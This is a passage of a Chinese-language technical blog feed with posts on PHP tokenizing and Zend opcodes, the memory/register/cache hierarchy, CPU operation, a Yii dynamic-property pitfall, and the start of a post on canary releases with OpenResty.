class="line">           [<span class="number">0</span>] =&gt; <span class="number">367</span></span><br><span class="line">           [<span class="number">1</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">316</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="keyword">echo</span></span><br><span class="line">        )</span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">315</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="string">"Hello World"</span></span><br><span class="line">        )</span><br><span class="line">    [<span class="number">4</span>] =&gt; ;</span><br><span class="line">    [<span class="number">5</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">6</span>] =&gt; =</span><br><span class="line">    [<span class="number">7</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">8</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">305</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">    [<span class="number">9</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">10</span>] =&gt; +</span><br><span class="line">    [<span class="number">11</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">12</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">305</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">    [<span class="number">13</span>] =&gt; ;</span><br><span class="line">    [<span class="number">14</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">15</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">316</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="keyword">echo</span></span><br><span class="line">        )</span><br><span class="line">    [<span class="number">16</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">370</span></span><br><span class="line">            [<span class="number">1</span>] =&gt;</span><br><span class="line">        )</span><br><span class="line">    [<span class="number">17</span>] =&gt; ;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>分析这个返回结果我们可以发现，源码中的字符串，字符，空格，都会原样返回。每个源代码中的字符，都会出现在相应的顺序处。而，其他的比如标签，操作符，语句，都会被转换成一个包含俩部分的Array: Token ID (也就是在Zend内部的改Token的对应码，比如,T_ECHO,T_STRING)，和源码中的原来的内容。</p><p>接下来，就是Parsing阶段了，Parsing首先会丢弃Tokens Array中的多于的空格，然后将剩余的Tokens转换成一个一个的简单的表达式</p><ol><li>echo a constant string</li><li>add two numbers together</li><li>store the result of the prior expression to a variable</li><li>echo a variable</li></ol><p>然后就改Compilation阶段了，它会把Tokens编译成一个个op_array, 每个op_arrayd包含如下5个部分：</p><ol><li>Opcode数字的标识，指明了每个op_array的操作类型，比如add , echo</li><li>结果 存放Opcode结果</li><li>操作数1 给Opcode的操作数</li><li>操作数2</li><li>扩展值1个整形用来区别被重载的操作符</li></ol><p>比如，我们的PHP代码会被Parsing成:</p><ul><li>ZEND_ECHO ‘Hello World’</li><li>ZEND_ADD ~0 1 1</li><li>ZEND_ASSIGN !0 ~0</li><li>ZEND_ECHO !0</li></ul><p>你可能会问了，我们的$a去那里了？  这个要介绍操作数了，每个操作数都是由以下俩个部分组成：</p><ul><li>op_type : 为IS_CONST, IS_TMP_VAR, IS_VAR, IS_UNUSED, or IS_CV </li><li>u,一个联合体，根据op_type的不同，分别用不同的类型保存了这个操作数的值(const)或者左值(var)</li></ul><p>而对于var来说，每个var也不一样</p><p>IS_TMP_VAR 顾名思义，这个是一个临时变量，保存一些op_array的结果，以便接下来的op_array使用，这种的操作数的u保存着一个指向变量表的一个句柄（整数），这种操作数一般用<del>开头，比如</del>0,表示变量表的0号未知的临时变量</p><p>IS_VAR 这种就是我们一般意义上的变量了,他们以$开头表示</p><p>IS_CV 表示ZE2.1/PHP5.1以后的编译器使用的一种cache机制，这种变量保存着被它引用的变量的地址，当一个变量第一次被引用的时候，就会被CV起来，以后对这个变量的引用就不需要再次去查找active符号表了，CV变量以！开头表示。</p><p>这么看来，我们的$a被优化成!0了。</p><p>详见鸟哥博客：<a href="http://www.laruence.com/php-internal" target="_blank" rel="noopener">PHP源码分析</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存，寄存器和缓存</title>
      <link href="/2019/03/27/2019-03-27-%E5%86%85%E5%AD%98%EF%BC%8C%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E7%BC%93%E5%AD%98/"/>
      <url>/2019/03/27/2019-03-27-%E5%86%85%E5%AD%98%EF%BC%8C%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 内存，寄存器和缓存的区别与联系 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="存储体系"><a href="#存储体系" class="headerlink" title="存储体系"></a>存储体系</h3><p>首先看一下计算机的存储体系（Memory hierarchy）金字塔：</p><img src="/2019/03/27/2019-03-27-内存，寄存器和缓存/pic1.png"><p>其次我们看看一个计算机的存储体系:</p><img src="/2019/03/27/2019-03-27-内存，寄存器和缓存/pic2.png"><p>* <strong>Register：寄存器</strong>是CPU的内部组成单元，是CPU运算时取指令和数据的地方，速度很快，寄存器可以用来暂存指令、数据和地址。在CPU中，通常有通用寄存器（如指令寄存器IR）；特殊功能寄存器（如程序计数器PC、sp等）<br>* <strong>Cache：缓存</strong>就是用于暂时存放内存中的数据，若果寄存器要取内存中的一部分数据时，可直接从缓存中取到，这样可以调高速度。高速缓存是内存的部分拷贝。<br>* <strong>RAM-memory：内存</strong>是用于存放数据的单元。其作用是用于暂时存放CPU中的运算数据，以及与硬盘等外部存储器交换的数据。<br>* <strong>HardDisk：硬盘</strong></p><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><p>CPU  &lt;— &gt; 寄存器&lt;— &gt; 缓存&lt;— &gt;内存</p><p>寄存器的工作方式很简单，只有两步：</p><ol><li>找到相关的位</li><li>读取这些位</li></ol><p>内存的工作方式就要复杂得多：</p><ol><li>找到数据的指针。（指针可能存放在寄存器内，所以这一步就已经包括寄存器的全部工作了。</li><li>将指针送往内存管理单元（MMU），由MMU将虚拟的内存地址翻译成实际的物理地址。</li><li>将物理地址送往内存控制器（memory controller），由内存控制器找出该地址在哪一根内存插槽（bank）上。</li><li>确定数据在哪一个内存块（chunk）上，从该块读取数据。</li><li>数据先送回内存控制器，再送回CPU，然后开始使用。</li></ol><p>内存的工作流程比寄存器多出许多步。每一步都会产生延迟，累积起来就使得内存比寄存器慢得多。</p><p>为了缓解寄存器与内存之间的巨大速度差异，硬件设计师做出了许多努力，包括在CPU内部设置缓存、优化CPU工作方式，尽量一次性从内存读取指令所要用到的全部数据等等。</p><h3 id="寄存器为何比内存快"><a href="#寄存器为何比内存快" class="headerlink" title="寄存器为何比内存快"></a>寄存器为何比内存快</h3><blockquote><p>registers are closer to the ALU than memory</p></blockquote><p>可以认为基本上是对的，这里先来看看访问速度的比较：</p><p>一条汇编指令大概执行过程是（<strong>不是绝对的，不同平台有差异</strong>）：</p><ul><li>取指（取指令）</li><li>译码（把指令转换成微指令）</li><li>取数（读内存里的操作数）</li><li>计算（各种计算的过程，ALU负责）</li><li>写回（将计算结果写回内存）</li></ul><p>有些平台里，前两步会合并成一步，某些指令也不会有取数或者回写的过程。</p><p>再提一下CPU主频的概念：首先，主频绝对不等于一秒钟可以执行的指令个数，每个指令的执行成本是不同的，比如x86平台里汇编指令INC就比ADD要快，具体每个指令的时钟周期可以参考intel的手册。</p><p>为什么要提主频？因为上面的执行过程中，每个操作都需要占用一个时钟周期，对于一个操作内存的加法，就需要5个时钟周期，换句话说，500Mhz主频的CPU，最多执行100MHz条指令。</p><p>仔细观察，上面的步骤里不包括寄存器操作，对于CPU来说读/写寄存器是不需要时间的，或者说如果只是操作寄存器（比如类似mov BX,AX之类的操作），那么一秒钟执行的指令个数理论上说就等于主频，因为寄存器是CPU的一部分。</p><p>然后寄存器往下就是各级的cache，有L1 cache，L2，甚至有L3的，以及TLB这些（TLB也可以认为是cache），之后就是内存，前面说寄存器快，现在说为什么这些慢：</p><p>对于各级的cache，访问速度是不同的，理论上说L1 cache（一级缓存）有着跟CPU寄存器相同的速度，但L1 cache有一个问题，当需要同步cache和内存之间的内容时，需要锁住cache的某一块（术语是cache line），然后再进行cache或者内存内容的更新，这段期间这个cache块是不能被访问的，所以L1 cache的速度就没寄存器快，因为它会频繁的有一段时间不可用。</p><p>L1 cache下面是L2 cache，甚至L3 cache，这些都有跟L1 cache一样的问题，要加锁，同步，并且L2比L1慢，L3比L2慢，这样速度也就更低了。</p><p>最后说说内存，内存的主频现在主流是1333左右吧？或者1600，单位是MHz，这比CPU的速度要低的多，所以内存的速度起点就更低，然后内存跟CPU之间通信也不是想要什么就要什么的。</p><p>内存不仅仅要跟CPU通信，还要通过DMA控制器与其它硬件通信，CPU要发起一次内存请求，先要给一个信号说“我要访问数据了，你忙不忙？”如果此时内存忙，则通信需要等待，不忙的时候，通信才能正常。并且，这个请求信号的时间代价，就是够执行几个汇编指令了，所以，这是内存慢的一个原因。</p><p>另一个原因是：内存跟CPU之间通信的通道也是有限的，就是所谓的“总线带宽”，但，要记住这个带宽不仅仅是留给内存的，还包括显存之类的各种通信都要走这条路，并且由于路是共享的，所以任何请求发起之间都要先抢占，抢占带宽需要时间，带宽不够等待的话也需要时间。</p><p>以上两条加起来导致了CPU访问内存更慢，比cache还慢。</p><p>举个更容易懂的例子：</p><p>CPU要取寄存器AX的值，只需要一步：把AX给我拿来，AX就拿来了。<br>CPU要取L1 cache的某个值，需要1-3步（或者更多）：把某某cache行锁住，把某个数据拿来，解锁，如果没锁住就慢了。<br>CPU要取L2 cache的某个值，先要到L1 cache里取，L1说，我没有，在L2里，L2开始加锁，加锁以后，把L2里的数据复制到L1，再执行读L1的过程，上面的3步，再解锁。<br>CPU取L3 cache的也是一样，只不过先由L3复制到L2，从L2复制到L1，从L1到CPU。<br>CPU取内存则最复杂：通知内存控制器占用总线带宽，通知内存加锁，发起内存读请求，等待回应，回应数据保存到L3（如果没有就到L2），再从L3/2到L1，再从L1到CPU，之后解除总线锁定。</p><p>下面这个图，可以看看CPU离主存（main memory）有多远，这个图没画寄存器，可以理解为：所有的L1 cache下面是寄存器，寄存器下面是CPU</p><img src="/2019/03/27/2019-03-27-内存，寄存器和缓存/pic3.png"><h3 id="内存缓存和磁盘缓存的区别"><a href="#内存缓存和磁盘缓存的区别" class="headerlink" title="内存缓存和磁盘缓存的区别"></a>内存缓存和磁盘缓存的区别</h3><h4 id="内存缓存"><a href="#内存缓存" class="headerlink" title="内存缓存"></a>内存缓存</h4><p>高速缓存（英语：cache，英语发音：/kæʃ/ kash [1][2][3]，简称缓存），其原始意义是指访问速度比一般随机存取存储器（RAM）快的一种RAM，通常它不像系统主存那样使用DRAM技术，而使用昂贵但较快速的SRAM技术。</p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>Cache一词来源于1967年的一篇电子工程期刊论文。其作者将法语词“cache”赋予“safekeeping storage”的涵义，用于电脑工程领域。</p><p>当CPU处理数据时，它会先到Cache中去寻找，如果数据因之前的操作已经读取而被暂存其中，就不需要再从随机存取存储器（Main memory）中读取数据——由于CPU的运行速度一般比主内存的读取速度快，主存储器周期（访问主存储器所需要的时间）为数个时钟周期。因此若要访问主内存的话，就必须等待数个CPU周期从而造成浪费。</p><p>提供“缓存”的目的是为了让数据访问的速度适应CPU的处理速度，其基于的原理是内存中“程序执行与数据访问的局域性行为”，即一定程序执行时间和空间内，被访问的代码集中于一部分。为了充分发挥缓存的作用，不仅依靠“暂存刚刚访问过的数据”，还要使用硬件实现的指令预测与数据预取技术——尽可能把将要使用的数据预先从内存中取到缓存里。</p><p>CPU的缓存曾经是用在超级计算机上的一种高级技术，不过现今电脑上使用的的AMD或Intel微处理器都在芯片内部集成了大小不等的数据缓存和指令缓存，通称为L1缓存（L1 Cache即Level 1 On-die Cache，第一级片上高速缓冲存储器）；而比L1更大容量的L2缓存曾经被放在CPU外部（主板或者CPU接口卡上），但是现在已经成为CPU内部的标准组件；更昂贵的CPU会配备比L2缓存还要大的L3缓存（level 3 On-die Cache第三级高速缓冲存储器）。</p><h5 id="概念的扩充"><a href="#概念的扩充" class="headerlink" title="概念的扩充"></a>概念的扩充</h5><p>如今缓存的概念已被扩充，不仅在CPU和主内存之间有Cache，而且在内存和硬盘之间也有Cache（磁盘缓存），乃至在硬盘与网络之间也有某种意义上的Cache──称为Internet临时文件夹或网络内容缓存等。凡是位于速度相差较大的两种硬件之间，用于协调两者数据传输速度差异的结构，均可称之为Cache。</p><h5 id="地址镜像与变换"><a href="#地址镜像与变换" class="headerlink" title="地址镜像与变换"></a>地址镜像与变换</h5><p>主条目：CPU缓存#组相联<br>由于主存容量远大于CPU缓存的容量，因此两者之间就必须按一定的规则对应起来。地址镜像就是指按某种规则把主存块装入缓存中。地址变换是指当按某种镜像方式把主存块装入缓存后，每次访问CPU缓存时，如何把主存的物理地址（Physical address）或虚拟地址（Virtual address）变换成CPU缓存的地址，从而访问其中的数据。</p><h5 id="缓存置换策略"><a href="#缓存置换策略" class="headerlink" title="缓存置换策略"></a>缓存置换策略</h5><p>主条目：CPU缓存#置换策略、分页和缓存文件置换机制<br>主存容量远大于CPU缓存，磁盘容量远大于主存，因此无论是哪一层次的缓存都面临一个同样的问题：当容量有限的缓存的空闲空间全部用完后，又有新的内容需要添加进缓存时，如何挑选并舍弃原有的部分内容，从而腾出空间放入这些新的内容。解决这个问题的算法有几种，如最久未使用算法（LRU）、先进先出算法（FIFO）、最近最少使用算法（LFU）、非最近使用算法（NMRU）等，这些算法在不同层次的缓存上执行时拥有不同的效率和代价，需根据具体场合选择最合适的一种。</p><h4 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h4><p>磁盘缓存（Disk Buffer）或磁盘快取（Disk Cache）实际上是将下载到的数据先保存于系统为软件分配的内存空间中（这个内存空间被称之为“内存池”），当保存到内存池中的数据达到一个程度时，便将数据保存到硬盘中。这样可以减少实际的磁盘操作，有效的保护磁盘免于重复的读写操作而导致的损坏。</p><p>磁盘缓存是为了减少CPU透过I/O读取磁盘机的次数，提升磁盘I/O的效率，用一块内存来储存存取较频繁的磁盘内容；因为内存的存取是电子动作，而磁盘的存取是I/O动作，感觉上磁盘I/O变得较为快速。</p><p>相同的技巧可用在写入动作，我们先将欲写入的内容放入内存中，等到系统有其它空闲的时间，再将这块内存的资料写入磁盘中。</p><p>现在的磁盘通常有32MB或64MB缓存。旧的硬盘则有8MB或16MB。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单介绍CPU的工作原理</title>
      <link href="/2019/03/26/2019-03-26-%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8DCPU%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2019/03/26/2019-03-26-%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8DCPU%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 中央处理器（CPU，Central Processing Unit） <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="内部架构"><a href="#内部架构" class="headerlink" title="内部架构"></a>内部架构</h3><p>CPU 的根本任务就是执行指令，对计算机来说最终都是一串由 0 和 1 组成的序列。CPU 从逻辑上可以划分成 3 个模块，分别是控制单元、运算单元和存储单元 。其内部架构如下：</p><img src="/2019/03/26/2019-03-26-简单介绍CPU的工作原理/pic1.png"><h4 id="控制单元"><a href="#控制单元" class="headerlink" title="控制单元"></a>控制单元</h4><p>控制单元是整个CPU的指挥控制中心，由指令寄存器IR（Instruction Register）、指令译码器ID（Instruction Decoder）和 操作控制器OC（Operation Controller） 等组成，对协调整个电脑有序工作极为重要。它根据用户预先编好的程序，依次从存储器中取出各条指令，放在指令寄存器IR中，通过指令译码（分析）确定应该进行什么操作，然后通过操作控制器OC，按确定的时序，向相应的部件发出微操作控制信号。操作控制器OC中主要包括：节拍脉冲发生器、控制矩阵、时钟脉冲发生器、复位电路和启停电路等控制逻辑。</p><h4 id="运算单元"><a href="#运算单元" class="headerlink" title="运算单元"></a>运算单元</h4><p>运算单元是运算器的核心。可以执行算术运算（包括加减乘数等基本运算及其附加运算）和逻辑运算（包括移位、逻辑测试或两个值比较）。相对控制单元而言，运算器接受控制单元的命令而进行动作，即运算单元所进行的全部操作都是由控制单元发出的控制信号来指挥的，所以它是执行部件。</p><h4 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h4><p>存储单元包括 CPU 片内缓存和寄存器组，是 CPU 中暂时存放数据的地方，里面保存着那些等待处理的数据，或已经处理过的数据，CPU 访问寄存器所用的时间要比访问内存的时间短。采用寄存器，可以减少 CPU 访问内存的次数，从而提高了 CPU 的工作速度。寄存器组可分为专用寄存器和通用寄存器。专用寄存器的作用是固定的，分别寄存相应的数据；而通用寄存器用途广泛并可由程序员规定其用途。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>总的来说，CPU 从内存中一条一条地取出指令和相应的数据，按指令操作码的规定，对数据进行运算处理，直到程序执行完毕为止。具体过程可分为以下四步：</p><h4 id="取指令"><a href="#取指令" class="headerlink" title="取指令"></a>取指令</h4><p>CPU 控制器从内存读取一条指令并放入指令寄存器。指令的格式如下：</p><img src="/2019/03/26/2019-03-26-简单介绍CPU的工作原理/pic2.png"><p><strong>操作码</strong>：就是汇编语言里的 mov，add，jmp 等符号码；<br><strong>操作数地址</strong>：说明该指令需要的操作数所在的地方，是在内存里还是在CPU的内部寄存器里。</p><h4 id="指令译码"><a href="#指令译码" class="headerlink" title="指令译码"></a>指令译码</h4><p>指令寄存器中的指令经过译码，决定该指令应进行何种操作（就是指令里的操作码）、操作数在哪里（操作数的地址） 。</p><h4 id="执行指令"><a href="#执行指令" class="headerlink" title="执行指令"></a>执行指令</h4><p>执行指令分为两个阶段： 取操作数 和 进行运算 。</p><p><strong>取操作数</strong>：CPU 通过寻址操作，从内存（数据段）中读取操作数到通用寄存器中，暂存起来。<br><strong>进行运算</strong>：运算单元通过指令中的操作码，对寄存器中的操作数进行 mov，add，jmp 操作。</p><h4 id="指令计数"><a href="#指令计数" class="headerlink" title="指令计数"></a>指令计数</h4><p>修改指令计数器，决定下一条指令的地址 。CPU 重复上述三步操作，处于内存代码段的指令被逐个的执行，直到程序执行完毕为止。</p><h3 id="CPU字长"><a href="#CPU字长" class="headerlink" title="CPU字长"></a>CPU字长</h3><p>CPU在单位时间内(同一时间)能一次处理的二进制数的位数叫字长。所以，能处理字长为 8 位数据的 CPU 通常就叫 8 位的 CPU。同理，32 位CPU 能在单位时间内处理字长为 32 位的二进制数据 。</p><p>常见的 32位 CPU 和 64位 CPU 主要存在以下两个差异：</p><h4 id="处理能力不同"><a href="#处理能力不同" class="headerlink" title="处理能力不同"></a>处理能力不同</h4><p>32 位 CPU 的一个指令，最大能处理 32 位二进制数据，即一次能处理 4 个字节数据。<br>64 位 CPU 的一个指令，最大能处理 64 位二进制数据，即一次能处理 8 个字节数据。</p><h4 id="寻址空间不同"><a href="#寻址空间不同" class="headerlink" title="寻址空间不同"></a>寻址空间不同</h4><p>32 位 CPU 的寻址范围是 32 位的二进制，32位二进制能表示的地址长度为2的32次方，即寻址空间最大为 4GB。<br>而 64 位CPU的寻址范围是 64 位的二进制。能表示的地址长度更大，其寻址空间也会更大。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一个Yii神坑</title>
      <link href="/2019/03/22/2019-03-22-%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AAYii%E7%A5%9E%E5%9D%91/"/>
      <url>/2019/03/22/2019-03-22-%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AAYii%E7%A5%9E%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 只有想不到没有坑不了 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="惊心动魄"><a href="#惊心动魄" class="headerlink" title="惊心动魄"></a>惊心动魄</h3><p>最近在写一个项目迭代，在慢慢跟之前的代码，陆陆续续的迭代。今天调一个页面的时候却出现了一个十分诡异的报错：</p><img src="/2019/03/22/2019-03-22-记录一个Yii神坑/pic1.png"><img src="/2019/03/22/2019-03-22-记录一个Yii神坑/pic2.png"><p>这十分不科学，相关代码不曾改动，测试环境也没有任何问题，而且本地跟测试是同一个docker环境…总之，要多诡异有多诡异。但没办法，错误它就是抛出来了，你得一一排查。</p><h3 id="错误追踪"><a href="#错误追踪" class="headerlink" title="错误追踪"></a>错误追踪</h3><p>根据错误提示，第一个想到的就是验证$fieldsMap[array_keys($this-&gt;LEVEL_1_MAP)[$key]]究竟是不是数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($fieldsMap[array_keys(<span class="keyword">$this</span>-&gt;LEVEL_1_MAP)[$key]]);</span><br></pre></td></tr></table></figure><img src="/2019/03/22/2019-03-22-记录一个Yii神坑/pic3.png"><p>这简直是年度最佳恐怖故事了，类型为string，没毛病，难道是model中没有这个属性？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($model-&gt;__A0);</span><br></pre></td></tr></table></figure><img src="/2019/03/22/2019-03-22-记录一个Yii神坑/pic4.png"><p>还是没有任何毛病，于是把目光放到抛出错误的地方：</p><img src="/2019/03/22/2019-03-22-记录一个Yii神坑/pic5.png"><p>这不得不让我去思考，$name究竟是怎么解析获得的呢？</p><h3 id="爬坑"><a href="#爬坑" class="headerlink" title="爬坑"></a>爬坑</h3><p>接着做了几个case，来验证这个$name：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$model-&gt;OK;</span><br><span class="line"></span><br><span class="line">Unknown Property – yii\base\UnknownPropertyException</span><br><span class="line">Getting unknown property: app\modules\survey\models\SurveyChoiceDistribution::OK</span><br></pre></td></tr></table></figure><p>直接写属性，没有问题，$name是OK；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$OK = <span class="string">'OK'</span>;</span><br><span class="line">$model-&gt;$OK;</span><br><span class="line"></span><br><span class="line">Unknown Property – yii\base\UnknownPropertyException</span><br><span class="line">Getting unknown property: app\modules\survey\models\SurveyChoiceDistribution::OK</span><br></pre></td></tr></table></figure><p>将OK赋予给一个字符串变量，$name还是OK；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$OKArr = [<span class="string">'OK'</span>];</span><br><span class="line">$model-&gt;$OKArr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">Unknown Property – yii\base\UnknownPropertyException</span><br><span class="line">Getting unknown property: app\modules\survey\models\SurveyChoiceDistribution::Array</span><br></pre></td></tr></table></figure><p>困扰我许久的Array出现了！！！Yii竟然是直接把$OKArr当做了属性，并没有解析$OKArr[0]。</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>了解Yii的解析机制后，其实也明白了为何要怎么解析。$model-&gt;$OKArr[0]这个写法是有歧义的，可以理解为$model-&gt;($OKArr[0])，也可以理解为($model-&gt;$OKArr)[0]。（注意，这里的括号只是为了方便标识，实际上并没有这种写法）</p><p>而测试和线上之所以可以正常解析，可能是因为不同的Yii版本，这才是坑的地方。</p><p>在这里给大家一个建议，如果有这种<strong>数组</strong>场景，最好写成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$OKArr = [<span class="string">'OK'</span>];</span><br><span class="line">$OK = OKArr[<span class="number">0</span>];</span><br><span class="line">$model-&gt;$OK;</span><br></pre></td></tr></table></figure><p>这实际上就是强制先解析数组，将Yii可以解析的字符串写入-&gt;后。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Yii </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态策略流量灰度发布</title>
      <link href="/2019/03/21/2019-03-21-%E5%8A%A8%E6%80%81%E7%AD%96%E7%95%A5%E6%B5%81%E9%87%8F%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83/"/>
      <url>/2019/03/21/2019-03-21-%E5%8A%A8%E6%80%81%E7%AD%96%E7%95%A5%E6%B5%81%E9%87%8F%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 黑白之间的平稳过度 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>听了组里一位大佬关于灰度发布方案的分享会，受益匪浅。于是整理了这一篇博客，加深一下印象和理解。</p><h3 id="什么是灰度发布"><a href="#什么是灰度发布" class="headerlink" title="什么是灰度发布"></a>什么是灰度发布</h3><p>引用百度百科的一段解释：</p><blockquote><p> 灰度发布（又名金丝雀发布）是指在黑与白之间，能够平滑过渡的一种发布方式。在其上可以进行A/B testing，即让一部分用户继续用产品特性A，一部分用户开始用产品特性B，如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面来。</p></blockquote><h3 id="为什么要做灰度发布"><a href="#为什么要做灰度发布" class="headerlink" title="为什么要做灰度发布"></a>为什么要做灰度发布</h3><p>一个产品，如果需要快速迭代开发上线，又要保证质量，保证刚上线的系统，一旦出现问题那么可以很快的控制影响面，就需要设计一套灰度发布系统。灰度发布系统的作用在于，可以根据自己的配置，来将用户的流量导到新上线的系统上，来快速验证新的功能修改，而一旦出问题，也可以马上的恢复，简单的说，就是一套A/BTest系统。</p><ul><li>灰度发布，动态分流，即时生效，无需重启</li><li>降低系统升级带来的影响范围，保证系统稳定性</li><li>提前规避一定的风险，具有一定的容灾能力</li></ul><h3 id="方案选型"><a href="#方案选型" class="headerlink" title="方案选型"></a>方案选型</h3><h4 id="ngx-lua"><a href="#ngx-lua" class="headerlink" title="ngx_lua"></a>ngx_lua</h4><p>简介：</p><ul><li>Openresty (<a href="https://openresty.org/cn/" target="_blank" rel="noopener">https://openresty.org/cn/</a>)</li></ul><p>原理：</p><ul><li>将lua VM嵌入到nginx worker里，nginx各阶段lua都可以参与</li><li>nginx IO原语封装注入lua VM，lua可以发起IO请求</li><li>ngx_lua采用协程处理每个请求，协程间互相隔离，数据安全</li><li>lua调用IO操作不能立即完成时，将自身协程挂起，不拥塞worker</li></ul><h4 id="虚拟主机配置："><a href="#虚拟主机配置：" class="headerlink" title="虚拟主机配置："></a>虚拟主机配置：</h4><img src="/2019/03/21/2019-03-21-动态策略流量灰度发布/pic1.png"><p>第一红框处，定义了两个upstream节点，一个是灰度服务器，一个是默认服务器；<br>第二个红框处，代理了这两个upstream节点；<br>第三个红框处，加载灰度策略控制的lua脚本。</p><h4 id="灰度策略控制中心lua脚本："><a href="#灰度策略控制中心lua脚本：" class="headerlink" 